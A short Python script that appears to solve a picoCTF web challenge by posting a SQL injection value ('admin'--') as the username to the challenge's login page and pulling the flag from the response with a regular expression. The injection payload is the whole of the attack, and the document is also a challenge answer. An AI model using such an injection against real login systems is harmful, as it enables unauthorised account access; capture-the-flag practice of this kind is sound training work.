import requests
import re

url = "https://jupiter.challenges.picoctf.org/problem/64649/login.php"
payload = {"username": "admin'--", "password": "HAHAHA", "debug": "0"}
r = requests.post(url, data=payload)
flag = re.findall(r'picoCTF{.*?}', r.text)[0]
print(flag)
